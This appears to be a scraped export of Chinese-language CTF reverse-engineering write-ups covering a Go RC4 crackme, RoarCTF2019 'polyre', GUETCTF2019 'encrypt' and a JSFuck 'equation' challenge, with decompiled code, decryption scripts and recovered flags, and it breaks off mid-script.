runtime_stringtoslicebyte(a1, a2, a3, v8, a5, a6, v18, a7, a8); main_Myencode(a1, a2, v17, v16); v11 = v15; if ( v16 == qword_55EA78 ) &#123; runtime_memequal(a1, a2, v15, main_enc, v9, v10); v12 = v15; &#125; else &#123; v12 = 0; &#125; if ( v12 ) &#123; *&amp;v20 = &amp;unk_4B0DA0; *(&amp;v20 + 1) = &amp;off_4E9B90; fmt_Fprintln(a1, a2, v11, &amp;go_itab__os_File_io_Writer, v9, v10, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v20); &#125; else &#123; *&amp;v19 = &amp;unk_4B0DA0; *(&amp;v19 + 1) = &amp;off_4E9BA0; fmt_Fprintln(a1, a2, v11, &amp;go_itab__os_File_io_Writer, v9, v10, &amp;go_itab__os_File_io_Writer, os_Stdout, &amp;v19); &#125; return sync___WaitGroup__Add(a1, a2, v13);&#125; 这个函数出现了一个 main_Myencode，看名字就觉得是个关键函数，再看后面也有一个类似刚才的数组，然后我们点进去看，发现一个关键信息 说明 flag 是我们输入的字符串的 md5 值，现在看 main_Myencode 函数 # main_Myencode 12345678910111213141516171819202122232425__int64 __fastcall main_Myencode(int a1, int a2, int a3, _DWORD a4, int a5, int a6, __int64 a7, __int64 a8, int a9)&#123; unsigned __int64 v9; // rcx int v10; // er8 int v11; // er9 __int64 v12; // r8 int v13; // er8 int v14; // er9 __int64 v16; // [rsp+18h] [rbp-50h] int v17; // [rsp+20h] [rbp-48h] int v18; // [rsp+28h] [rbp-40h] char v19[32]; // [rsp+38h] [rbp-30h] BYREF __int64 v20; // [rsp+58h] [rbp-10h] void *retaddr; // [rsp+68h] [rbp+0h] BYREF v9 = __readfsqword(0xFFFFFFF8); if ( &amp;retaddr &lt;= *(v9 + 16) ) runtime_morestack_noctxt(); runtime_makeslice(a1, a2, a3, v9, a5, a6, &amp;unk_4B0EE0, a8, a8); v20 = v16; runtime_stringtoslicebyte(a1, a2, qword_55E898, main_enc_key, v10, v11, v19, main_enc_key, qword_55E898); crypto_rc4_NewCipher(a1, a2, v18, v17, v12); crypto_rc4___Cipher__XORKeyStream(a1, a2, a9, a8, v13, v14); return a8;&#125; 看到了两个 rc4 加密的函数，说明这里是将输入的字符串进行了 rc4 加密，并且可以看到 21 行这里看到有一个 main_enc_key，这应该就是密钥了，可以直接看到它的值 &quot;thisiskkk&quot;，然后在这里突然又想起在外面那个函数也看到一个类似这个的东西，就是 main_enc，然后点进去看发现是个数组，这刚好和密钥的名字对应，肯定就是加密后的结果了 12340xD8, 0xE5, 0x85, 0xBE, 0xE7, 0xF8, 0x58, 0x75, 0x95, 0x65, 0x85, 0xE3, 0xA6, 0x47, 0x59, 0xB9, 0x14, 0x6F, 0x33, 0xB5, 0xCA, 0x84, 0x0B, 0xE7, 0x92, 0x0E, 0xD2, 0xFD, 0x64, 0x18, 0x96, 0xD0, 0x0F, 0x5E, 0x44, 0x3E 不过这不是最终的加密结果，一开始没有发现，最后这一串还异或了一个 0x23，在 ida 左侧的函数栏里面还有一个带有 main 的函数 main_init_0，在这个里面又将 rc4 后的结果进行了一次异或，所以虽然说名字像不一定是百分百有联系，但还是看一下比较好，官方的 wp 说还可以通过动调来直接找这个最终的密文，一开始也尝试了动调，但我是直接用 ida 的远程调试的，搞了很久没搞出来，可以用 gdb 调试，但 dlv 会更方便（不会 dlv） # 总体思路 程序将输入的字符串进行一次 rc4 加密再进行一次异或，我们只要先异或再解密就行了，知道了 key 和密文，再 rc4 解密一下就行了，解密脚本用的是一位大佬写的，解密之后得到 56e83694-f976-11eb-b343-faffc201c8e0，在 linux 中运行程序的时候，输入这个字符串，也会弹出提示，最终的 flag 是 DASCTF {md5 (Input)}，所以在程序的分析中没有发现这个也是没问题的 得到 flag：DASCTF{9e1963bbbb1285b993c862a5a6f12604}","tags":["reverse"],"categories":["wp"]},{"title":"RoarCTF2019-polyre","path":"/2022/07/22/RoarCTF2019-polyre/","content":"这道题刚打开看它的主函数的时候，看到它的控制流程图 而且主函数的代码也是一个非常长的循环，我们需要对它进行控制流平坦化，这里我是在 kali 中用 deflat.py 脚本操作的 平坦化之后就可以看正常的代码了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143__int64 __fastcall main(int a1, char **a2, char **a3)&#123; signed __int64 v4; // [rsp+1E0h] [rbp-110h] int i; // [rsp+1E8h] [rbp-108h] int v6; // [rsp+1ECh] [rbp-104h] int v7; // [rsp+1ECh] [rbp-104h] char s1[48]; // [rsp+1F0h] [rbp-100h] BYREF char s[60]; // [rsp+220h] [rbp-D0h] BYREF unsigned int v10; // [rsp+25Ch] [rbp-94h] char *v11; // [rsp+260h] [rbp-90h] int v12; // [rsp+26Ch] [rbp-84h] bool v13; // [rsp+272h] [rbp-7Eh] unsigned __int8 v14; // [rsp+273h] [rbp-7Dh] int v15; // [rsp+274h] [rbp-7Ch] char *v16; // [rsp+278h] [rbp-78h] int v17; // [rsp+284h] [rbp-6Ch] int v18; // [rsp+288h] [rbp-68h] bool v19; // [rsp+28Fh] [rbp-61h] char *v20; // [rsp+290h] [rbp-60h] int v21; // [rsp+298h] [rbp-58h] bool v22; // [rsp+29Fh] [rbp-51h] __int64 v23; // [rsp+2A0h] [rbp-50h] bool v24; // [rsp+2AFh] [rbp-41h] __int64 v25; // [rsp+2B0h] [rbp-40h] __int64 v26; // [rsp+2B8h] [rbp-38h] __int64 v27; // [rsp+2C0h] [rbp-30h] __int64 v28; // [rsp+2C8h] [rbp-28h] int v29; // [rsp+2D0h] [rbp-20h] int v30; // [rsp+2D4h] [rbp-1Ch] char *v31; // [rsp+2D8h] [rbp-18h] int v32; // [rsp+2E0h] [rbp-10h] int v33; // [rsp+2E4h] [rbp-Ch] bool v34; // [rsp+2EBh] [rbp-5h] v10 = 0; memset(s, 0, 0x30uLL); memset(s1, 0, sizeof(s1)); printf(&quot;Input:&quot;); v11 = s; if ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) goto LABEL_43; while ( 1 ) &#123; __isoc99_scanf(&quot;%s&quot;, v11); v6 = 0; if ( dword_603058 &lt; 10 || (((dword_603054 - 1) * dword_603054) &amp; 1) == 0 ) break;LABEL_43: __isoc99_scanf(&quot;%s&quot;, v11); &#125; while ( 1 ) &#123; do v12 = v6; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v13 = v12 &lt; 64; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) ; if ( !v13 ) break; v14 = s[v6]; do v15 = v14; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); if ( v15 == 10 ) &#123; v16 = &amp;s[v6]; *v16 = 0; break; &#125; v17 = v6 + 1; do v6 = v17; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); &#125; for ( i = 0; ; ++i ) &#123; do v18 = i; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); do v19 = v18 &lt; 6; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); if ( !v19 ) break; do v20 = s; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v4 = *&amp;v20[8 * i]; v7 = 0; while ( 1 ) &#123; v21 = v7; do v22 = v21 &lt; 64; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); if ( !v22 ) break; v23 = v4; v24 = v4 &lt; 0; if ( v4 &gt;= 0 ) &#123; v27 = v4; do v28 = 2 * v27; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v4 = v28; &#125; else &#123; v25 = 2 * v4; do v26 = v25; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v4 = v26 ^ 0xB0004B7679FA26B3LL; &#125; v29 = v7; do v7 = v29 + 1; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); &#125; v30 = 8 * i; v31 = &amp;s1[8 * i]; if ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 )LABEL_55: *v31 = v4; *v31 = v4; if ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) goto LABEL_55; v32 = i + 1; &#125; do v33 = memcmp(s1, &amp;unk_402170, 0x30uLL); while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ); v34 = v33 != 0; while ( dword_603058 &gt;= 10 &amp;&amp; (((dword_603054 - 1) * dword_603054) &amp; 1) != 0 ) ; if ( v34 ) puts(&quot;Wrong!&quot;); else puts(&quot;Correct!&quot;); return v10;&#125; 但实际上这还是挺长的，不过这里面有很多重复的无用语句可以删掉，官方的 wp 也有一个脚本可以简化代码，我就直接看简化后的代码了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; signed __int64 v4; // [rsp+1E0h] [rbp-110h] signed int j; // [rsp+1E8h] [rbp-108h] signed int i; // [rsp+1ECh] [rbp-104h] signed int k; // [rsp+1ECh] [rbp-104h] char s1[48]; // [rsp+1F0h] [rbp-100h] char s[60]; // [rsp+220h] [rbp-D0h] unsigned int v10; // [rsp+25Ch] [rbp-94h] char *v11; // [rsp+260h] [rbp-90h] int v12; // [rsp+26Ch] [rbp-84h] bool v13; // [rsp+272h] [rbp-7Eh] unsigned __int8 v14; // [rsp+273h] [rbp-7Dh] int v15; // [rsp+274h] [rbp-7Ch] char *v16; // [rsp+278h] [rbp-78h] int v17; // [rsp+284h] [rbp-6Ch] int v18; // [rsp+288h] [rbp-68h] bool v19; // [rsp+28Fh] [rbp-61h] char *v20; // [rsp+290h] [rbp-60h] int v21; // [rsp+298h] [rbp-58h] bool v22; // [rsp+29Fh] [rbp-51h] __int64 v23; // [rsp+2A0h] [rbp-50h] bool v24; // [rsp+2AFh] [rbp-41h] __int64 v25; // [rsp+2B0h] [rbp-40h] __int64 v26; // [rsp+2B8h] [rbp-38h] __int64 v27; // [rsp+2C0h] [rbp-30h] __int64 v28; // [rsp+2C8h] [rbp-28h] int v29; // [rsp+2D0h] [rbp-20h] int v30; // [rsp+2D4h] [rbp-1Ch] char *v31; // [rsp+2D8h] [rbp-18h] int v32; // [rsp+2E0h] [rbp-10h] int v33; // [rsp+2E4h] [rbp-Ch] bool v34; // [rsp+2EBh] [rbp-5h] v10 = 0; memset(s, 0, 0x30uLL); memset(s1, 0, 0x30uLL); printf(&quot;Input:&quot;, 0LL); v11 = s; __isoc99_scanf(&quot;%s&quot;, s, (dword_603054 - 1), 3788079310LL); for ( i = 0; ; ++i ) &#123; v12 = i; v13 = i &lt; 64; if ( i &gt;= 64 ) break; v14 = s[i]; v15 = v14; if ( v14 == 10 ) &#123; v16 = &amp;s[i]; *v16 = 0; break; &#125; v17 = i + 1; &#125; for ( j = 0; ; ++j ) &#123; v18 = j; v19 = j &lt; 6; if ( j &gt;= 6 ) break; v20 = s; v4 = *&amp;s[8 * j]; for ( k = 0; ; ++k ) &#123; v21 = k; v22 = k &lt; 64; if ( k &gt;= 64 ) break; v23 = v4; v24 = v4 &lt; 0; if ( v4 &gt;= 0 ) &#123; v27 = v4; v28 = 2 * v4; v4 *= 2LL; &#125; else &#123; v25 = 2 * v4; v26 = 2 * v4; v4 = 2 * v4 ^ 0xB0004B7679FA26B3LL; &#125; v29 = k; &#125; v30 = 8 * j; v31 = &amp;s1[8 * j]; *v31 = v4; v32 = j + 1; &#125; v33 = memcmp(s1, &amp;unk_402170, 0x30uLL); v34 = v33 != 0; if ( v33 != 0 ) puts(&quot;Wrong!&quot;); else puts(&quot;Correct!&quot;); return v10;&#125; 简化后再看它的逻辑就比较清晰了，先是输入一串长为 0x30 也就是 48 的字符串，将每八个字节分为一组一共六组，然后取每一组的首个数据进行正负判断，如果是正就乘 2 也就是左移一位，为负也是左移一位但还要进行一次异或运算，一共循环 64 次，这个是用 CRC32 算法来取得一个查表法所用的表，而在后面还有一次 CRC64 的加密，这里我还不是很懂，只能搞出这个表，看网上的 wp 最后一步都要再右移八位，这个应该就是 CRC64 的操作了，最后在和 &amp; unk_402170 进行对比，这个就是最后的数据了，脚本如下 12345678910111213141516171819202122a = [0xBC8FF26D43536296, 0x520100780530EE16, 0x4DC0B5EA935F08EC, 0x342B90AFD853F450, 0x8B250EBCAA2C3681, 0x55759F81A2C68AE4]flag = &#x27;&#x27;for s in a: for i in range(64): b = s &amp; 1 if b == 1: s ^= 0xB0004B7679FA26B3 s //= 2 if b == 1: s |= 0x8000000000000000 print(s) j = 0 while j &lt; 8: flag += chr(s &amp; 0xFF) s &gt;&gt;= 8 j += 1print(flag) 得到 flag {6ff29390-6c20-4c56-ba70-a95758e3d1f8}","tags":["reverse"],"categories":["wp"]},{"title":"GUETCTF2019-encrypt","path":"/2022/07/21/GUETCTF2019-encrypt/","content":"这道题的总体思路还是比较清晰的，没有搞一些乱七八糟的东西来混淆我们，它就是用三个函数对输入的 flag 进行加密之后，再和 byte_602080 对比 # 主函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344__int64 __fastcall main(int a1, char **a2, char **a3)&#123; int v3; // eax int v4; // eax char v6[4]; // [rsp+4h] [rbp-93Ch] BYREF int i; // [rsp+8h] [rbp-938h] int v8; // [rsp+Ch] [rbp-934h] _DWORD v9[260]; // [rsp+10h] [rbp-930h] BYREF char v10[16]; // [rsp+420h] [rbp-520h] BYREF char s[256]; // [rsp+430h] [rbp-510h] BYREF char v12[1032]; // [rsp+530h] [rbp-410h] BYREF unsigned __int64 v13; // [rsp+938h] [rbp-8h] v13 = __readfsqword(0x28u); v10[0] = 16; v10[1] = 32; v10[2] = 48; v10[3] = 48; v10[4] = 32; v10[5] = 32; v10[6] = 16; v10[7] = 64; memset(s, 0, sizeof(s)); v8 = strlen(s); memset(v12, 0, 0x400uLL); printf(&quot;please input your flag:&quot;); scanf(&quot;%s&quot;, s); memset(v9, 0, 0x408uLL); sub_4006B6(v9, v10, 8); v3 = strlen(s); sub_4007DB(v9, s, v3); v4 = strlen(s); sub_4008FA(s, v4, v12, v6); for ( i = 0; i &lt;= 50; ++i ) &#123; if ( v12[i] != byte_602080[i] ) &#123; puts(&quot;Wrong&quot;); return 0LL; &#125; &#125; puts(&quot;Good&quot;); return 0LL;&#125; 这个数组的值已经给出来了 123456[0x5A, 0x60, 0x54, 0x7A, 0x7A, 0x54, 0x72, 0x44, 0x7C, 0x66, 0x51, 0x50, 0x5B, 0x5F, 0x56, 0x56, 0x4C, 0x7C, 0x79, 0x6E, 0x65, 0x55, 0x52, 0x79, 0x55, 0x6D, 0x46, 0x6B, 0x6C, 0x56, 0x4A, 0x67, 0x4C, 0x61, 0x73, 0x4A, 0x72, 0x6F, 0x5A, 0x70, 0x48, 0x52, 0x78, 0x49, 0x55, 0x6C, 0x48, 0x5C, 0x76, 0x5A, 0x45, 0x3D] 接下来就看三个函数分别做了些什么吧 # sub_4006B6 函数 123456789101112131415161718192021222324252627282930bool __fastcall sub_4006B6(_DWORD *a1, __int64 a2, int a3)&#123; bool result; // al int i; // [rsp+1Ch] [rbp-18h] int j; // [rsp+1Ch] [rbp-18h] int v6; // [rsp+20h] [rbp-14h] int v7; // [rsp+24h] [rbp-10h] int v8; // [rsp+28h] [rbp-Ch] _DWORD *v9; // [rsp+2Ch] [rbp-8h] *a1 = 0; a1[1] = 0; v9 = a1 + 2; for ( i = 0; i &lt;= 255; ++i ) v9[i] = i; v7 = 0; result = 0; LOBYTE(v6) = 0; for ( j = 0; j &lt;= 255; ++j ) &#123; v8 = v9[j]; v6 = (v6 + v8 + *(v7 + a2)); v9[j] = v9[v6]; v9[v6] = v8; result = ++v7 &gt;= a3; if ( v7 &gt;= a3 ) v7 = 0; &#125; return result;&#125; 这里很明显可以看出就是 RC4 加密，这里是在创建 S 盒，并且进行了一部分的置换 # sub_4007DB 函数 12345678910111213141516171819202122232425262728_DWORD *__fastcall sub_4007DB(_DWORD *a1, __int64 a2, int a3)&#123; _DWORD *result; // rax int i; // [rsp+18h] [rbp-1Ch] int v5; // [rsp+1Ch] [rbp-18h] int v6; // [rsp+20h] [rbp-14h] int v7; // [rsp+24h] [rbp-10h] int v8; // [rsp+28h] [rbp-Ch] _DWORD *v9; // [rsp+2Ch] [rbp-8h] v5 = *a1; v6 = a1[1]; v9 = a1 + 2; for ( i = 0; i &lt; a3; ++i ) &#123; v5 = (v5 + 1); v7 = v9[v5]; v6 = (v6 + v7); v8 = v9[v6]; v9[v5] = v8; v9[v6] = v7; *(i + a2) ^= LOBYTE(v9[(v7 + v8)]); &#125; *a1 = v5; result = a1; a1[1] = v6; return result;&#125; 这里是 RC4 加密的后一部分，再进行了最后的 S 盒的置换后，用新的 S 盒和我们输入的 flag 进行异或运算，得到加密后的结果，这里 v9 就是最后的 S 盒，a2 是 flag # sub_4008FA 函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364_DWORD *__fastcall sub_4008FA(__int64 a1, int a2, const char *a3, _DWORD *a4)&#123; int v4; // eax int v5; // eax unsigned __int8 v6; // al int v7; // eax unsigned __int8 v8; // al int v9; // eax int v10; // edx _DWORD *result; // rax char v13; // [rsp+2Dh] [rbp-13h] unsigned __int8 v14; // [rsp+2Eh] [rbp-12h] unsigned __int8 v15; // [rsp+2Fh] [rbp-11h] int v16; // [rsp+30h] [rbp-10h] int v17; // [rsp+34h] [rbp-Ch] v16 = 0; v17 = 0; while ( v17 &lt; a2 ) &#123; v4 = v17++; v13 = *(v4 + a1); if ( v17 &gt;= a2 ) &#123; v6 = 0; &#125; else &#123; v5 = v17++; v6 = *(v5 + a1); &#125; v14 = v6; if ( v17 &gt;= a2 ) &#123; v8 = 0; &#125; else &#123; v7 = v17++; v8 = *(v7 + a1); &#125; v15 = v8; a3[v16] = ((v13 &gt;&gt; 2) &amp; 0x3F) + 61; a3[v16 + 1] = (((v14 &gt;&gt; 4) | (16 * v13)) &amp; 0x3F) + 61; a3[v16 + 2] = (((v8 &gt;&gt; 6) | (4 * v14)) &amp; 0x3F) + 61; v9 = v16 + 3; v16 += 4; a3[v9] = (v15 &amp; 0x3F) + 61; &#125; if ( a2 % 3 == 1 ) &#123; a3[--v16] = 61; &#125; else if ( a2 % 3 != 2 ) &#123; goto LABEL_15; &#125; a3[v16 - 1] = 61;LABEL_15: v10 = strlen(a3); result = a4; *a4 = v10; return result;&#125; 这个函数很像 base64，因为它在 43~48 行有一个三字节变四字节的操作，不过又不是完整的 base64，感觉也不像是换表的操作，根本没有找到表，所以最后还是直接逆运算搞出来了 # 整体思路 前两个函数是 RC4 加密，具体的 v9 值可以动调提取数据 通过汇编代码可以看出来这个 v9 的值应该就是 edx 里面的值了，esi 是输入的值，动调的时候直接在 xor 这里下个断点就可以看了，下面是 v9 的值也就是最后的 S 盒 123456789[0x10, 0x59, 0x9C, 0x92, 0x06, 0x22, 0xCF, 0xA5, 0x72, 0x1E, 0x45, 0x6A, 0x06, 0xCB, 0x08, 0xC3, 0xE4, 0x49, 0x5A, 0x63, 0x0C, 0xDF, 0xF6, 0x5F, 0x08, 0x28, 0xBD, 0xE2, 0x10, 0x15, 0x1F, 0x6E, 0xAA, 0x5A, 0xCA, 0xEC, 0x80, 0xAF, 0x9B, 0x16, 0xBB, 0x3D, 0x13, 0x2F, 0x6A, 0xA4, 0xC7, 0x2E, 0xBC, 0x4B, 0x60, 0x9A, 0xAF, 0xE9, 0xCE, 0xDA, 0x67, 0x39, 0xBA, 0x3B, 0x85, 0xEB, 0xD2, 0x6B, 0xAB, 0x06, 0x6B, 0x10, 0x57, 0x2C, 0x88, 0x70, 0xF7, 0x4F, 0xAA, 0x7F, 0x12, 0x47, 0xD6, 0xDE, 0x74, 0xB2, 0x1D, 0xA4, 0xD7, 0x76, 0x9A, 0xE0] 在输入的 flag 和这个 v9 异或之后，又在第三个函数中将其 3 变 4，并有一点点的运算在里面，这个我们直接拿最后的结果反向算一遍就可以了 其中 v13，v14，v8 也就是 v15，分别是原来的三个字节，而在这里它被改变成了 a3 [v16] 到 a3 [v16+3] 相当于四个字节，所以原来的三个字节就是前两个函数加密后的结果，我们只要把它四个四个一组恢复成三字节就行了，还要注意一下这个位移和与运算的关系，v14 和 v15 放到一起的时候要把 0x3F 拆开，不然 flag 会不完整 # 脚本 123456789101112131415161718192021222324252627a = [0x5A, 0x60, 0x54, 0x7A, 0x7A, 0x54, 0x72, 0x44, 0x7C, 0x66, 0x51, 0x50, 0x5B, 0x5F, 0x56, 0x56, 0x4C, 0x7C, 0x79, 0x6E, 0x65, 0x55, 0x52, 0x79, 0x55, 0x6D, 0x46, 0x6B, 0x6C, 0x56, 0x4A, 0x67, 0x4C, 0x61, 0x73, 0x4A, 0x72, 0x6F, 0x5A, 0x70, 0x48, 0x52, 0x78, 0x49, 0x55, 0x6C, 0x48, 0x5C, 0x76, 0x5A, 0x45, 0x3D]flag = &#x27;&#x27;for i in range(0, len(a), 4): flag += chr((((a[i] - 61) &amp; 0x3F) &lt;&lt; 2) | (((a[i+1] - 61) &amp; 0x30) &gt;&gt; 4)) flag += chr((((a[i+1] - 61) &amp; 0x0F) &lt;&lt; 4) | (((a[i+2] - 61) &amp; 0x3C) &gt;&gt; 2)) # 这里0x30和0x3C可以去掉 flag += chr(((a[i+3] - 61) &amp; 0x3F) | (((a[i+2] - 61) &amp; 0x03) &lt;&lt; 6))S = [0x10, 0x59, 0x9C, 0x92, 0x06, 0x22, 0xCF, 0xA5, 0x72, 0x1E, 0x45, 0x6A, 0x06, 0xCB, 0x08, 0xC3, 0xE4, 0x49, 0x5A, 0x63, 0x0C, 0xDF, 0xF6, 0x5F, 0x08, 0x28, 0xBD, 0xE2, 0x10, 0x15, 0x1F, 0x6E, 0xAA, 0x5A, 0xCA, 0xEC, 0x80, 0xAF, 0x9B, 0x16, 0xBB, 0x3D, 0x13, 0x2F, 0x6A, 0xA4, 0xC7, 0x2E, 0xBC, 0x4B, 0x60, 0x9A, 0xAF, 0xE9, 0xCE, 0xDA, 0x67, 0x39, 0xBA, 0x3B, 0x85, 0xEB, 0xD2, 0x6B, 0xAB, 0x06, 0x6B, 0x10, 0x57, 0x2C, 0x88, 0x70, 0xF7, 0x4F, 0xAA, 0x7F, 0x12, 0x47, 0xD6, 0xDE, 0x74, 0xB2, 0x1D, 0xA4, 0xD7, 0x76, 0x9A, 0xE0]for i in range(len(flag)): flag += chr(ord(flag[i]) ^ S[i])print(flag) 我这个脚本有点 bug，输出的结果前面会有一串乱码，但是结果是对的 得到 flag {e10adc3949ba59abbe56e057f20f883e}","tags":["reverse"],"categories":["wp"]},{"title":"equation","path":"/2022/07/06/equation/","content":"拿到题目之后，有两个文件，一个.DS_Store 和一个 equation，然后上网查了一下.DS_Store 文件 DS_Store，英文全称是 Desktop Services Store（桌面服务存储），开头的 DS 是 Desktop Services（桌面服务） 的缩写。它是一种由 macOS 系统自动创建的隐藏文件，存在于每一个用「访达」打开过的文件夹下面 并没有什么用，用各种编辑器打开看了都没什么有用的信息，然后在看 equation.html，点开之后可以看到 虽然没学过 javascript，但很明显这里只要 if 的条件成立就正确，flag 就在其中，根据题目的提示，这是 fuck 加密，而且大概分析一下可以看出来，这是一个多元一次方程组，最后可以用 z3-solver 来解，现在就是要解密了，这个 jsfuck 加密可以在网上找到在线工具解密，但是每次都要把 l 括号里面的密文复制出来一个一个去解密，就很麻烦，所以就在网上找了个脚本一次性解了 12345678910111213&lt;script&gt;\tfunction deEquation(str) &#123; for(let i = 0; i &lt;= 1; i++) &#123; str = str.replace(/l\\[(\\D*?)](\\+l|-l|==)/g, (m, a, b) =&gt; &#x27;l[&#x27; + eval(a) + &#x27;]&#x27; + b); &#125; str = str.replace(/==(\\D*?)&amp;&amp;/g, (m, a) =&gt; &#x27;==&#x27; + eval(a) + &#x27;&amp;&amp;&#x27;); return str;\t&#125;\tjs=&quot;&quot;//将代码放入其中\tres=deEquation(js);\tdocument.write(res);&lt;/script&gt; 用 notepad 保存之后拖到浏览器打开就可以运行出结果了，不过最后一个方程的结果没解出来，就用在线工具解一下，等于 81，最后把这些方程用 z3-solver 解一下 flag 就出来了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from z3 import *s=Solver()l=IntVector(&#x27;l&#x27;,42)s.add(l[40]+l[35]+l[34]-l[0]-l[15]-l[37]+l[7]+l[6]-l[26]+l[20]+l[19]+l[8]-l[17]-l[14]-l[38]+l[1]-l[9]+l[22]+l[41]+l[3]-l[29]-l[36]-l[25]+l[5]+l[32]-l[16]+l[12]-l[24]+l[30]+l[39]+l[10]+l[2]+l[27]+l[28]+l[21]+l[33]-l[18]+l[4]==861)s.add(l[31]+l[26]+l[11]-l[33]+l[27]-l[3]+l[12]+l[30]+l[1]+l[32]-l[16]+l[7]+l[10]-l[25]+l[38]-l[41]-l[14]-l[19]+l[29]+l[36]-l[9]-l[28]-l[6]-l[0]-l[22]-l[18]+l[20]-l[37]+l[4]-l[24]+l[34]-l[21]-l[39]-l[23]-l[8]-l[40]+l[15]-l[35]==-448)s.add(l[26]+l[14]+l[15]+l[9]+l[13]+l[30]-l[11]+l[18]+l[23]+l[7]+l[3]+l[12]+l[25]-l[24]-l[39]-l[35]-l[20]+l[40]-l[8]+l[10]-l[5]-l[33]-l[31]+l[32]+l[19]+l[21]-l[6]+l[1]+l[16]+l[17]+l[29]+l[22]-l[4]-l[36]+l[41]+l[38]+l[2]+l[0]==1244)s.add(l[5]+l[22]+l[15]+l[2]-l[28]-l[10]-l[3]-l[13]-l[18]+l[30]-l[9]+l[32]+l[19]+l[34]+l[23]-l[17]+l[16]-l[7]+l[24]-l[39]+l[8]-l[12]-l[40]-l[25]+l[37]-l[35]+l[11]-l[14]+l[20]-l[27]+l[4]-l[33]-l[21]+l[31]-l[6]+l[1]+l[38]-l[29]==-39)s.add(l[41]-l[29]+l[23]-l[4]+l[20]-l[33]+l[35]+l[3]-l[19]-l[21]+l[11]+l[26]-l[24]-l[17]+l[37]+l[1]+l[16]-l[0]-l[13]+l[7]+l[10]+l[14]+l[22]+l[39]-l[40]+l[34]-l[38]+l[32]+l[25]-l[2]+l[15]+l[6]+l[28]-l[8]-l[5]-l[31]-l[30]-l[27]==485)s.add(l[13]+l[19]+l[21]-l[2]-l[33]-l[0]+l[39]+l[31]-l[23]-l[41]+l[38]-l[29]+l[36]+l[24]-l[20]-l[9]-l[32]+l[37]-l[35]+l[40]+l[7]-l[26]+l[15]-l[10]-l[6]-l[16]-l[4]-l[5]-l[30]-l[14]-l[22]-l[25]-l[34]-l[17]-l[11]-l[27]+l[1]-l[28]==-1068)s.add(l[32]+l[0]+l[9]+l[14]+l[11]+l[18]-l[13]+l[24]-l[2]-l[15]+l[19]-l[21]+l[1]+l[39]-l[8]-l[3]+l[33]+l[6]-l[5]-l[35]-l[28]+l[25]-l[41]+l[22]-l[17]+l[10]+l[40]+l[34]+l[27]-l[20]+l[23]+l[31]-l[16]+l[7]+l[12]-l[30]+l[29]-l[4]==939)s.add(l[19]+l[11]+l[20]-l[16]+l[40]+l[25]+l[1]-l[31]+l[28]-l[23]+l[14]-l[9]-l[27]+l[35]+l[39]-l[37]-l[8]-l[22]+l[5]-l[6]+l[0]-l[32]+l[24]+l[33]+l[29]+l[38]+l[15]-l[2]+l[30]+l[7]+l[12]-l[3]-l[17]+l[34]+l[41]-l[4]-l[13]-l[26]==413)s.add(l[22]+l[4]-l[9]+l[34]+l[35]+l[17]+l[3]-l[24]+l[38]-l[5]-l[41]-l[31]-l[0]-l[25]+l[33]+l[15]-l[1]-l[10]+l[16]-l[29]-l[12]+l[26]-l[39]-l[21]-l[18]-l[6]-l[40]-l[13]+l[8]+l[37]+l[19]+l[14]+l[32]+l[28]-l[11]+l[23]+l[36]+l[7]==117)s.add(l[32]+l[16]+l[3]+l[11]+l[34]-l[31]+l[14]+l[25]+l[1]-l[30]-l[33]-l[40]-l[4]-l[29]+l[18]-l[27]+l[13]-l[19]-l[12]+l[23]-l[39]-l[41]-l[8]+l[22]-l[5]-l[38]-l[9]-l[37]+l[17]-l[36]+l[24]-l[21]+l[2]-l[26]+l[20]-l[7]+l[35]-l[0]==-313)s.add(l[40]-l[1]+l[5]+l[7]+l[33]+l[29]+l[12]+l[38]-l[31]+l[2]+l[14]-l[35]-l[8]-l[24]-l[39]-l[9]-l[28]+l[23]-l[17]-l[22]-l[26]+l[32]-l[11]+l[4]-l[36]+l[10]+l[20]-l[18]-l[16]+l[6]-l[0]+l[3]-l[30]+l[37]-l[19]+l[21]+l[25]-l[15]==-42)s.add(l[21]+l[26]-l[17]-l[25]+l[27]-l[22]-l[39]-l[23]-l[15]-l[20]-l[32]+l[12]+l[3]-l[6]+l[28]+l[31]+l[13]-l[16]-l[37]-l[30]-l[5]+l[41]+l[29]+l[36]+l[1]+l[11]+l[24]+l[18]-l[40]+l[19]-l[35]+l[2]-l[38]+l[14]-l[9]+l[4]+l[0]-l[33]==289)s.add(l[29]+l[31]+l[32]-l[17]-l[7]+l[34]+l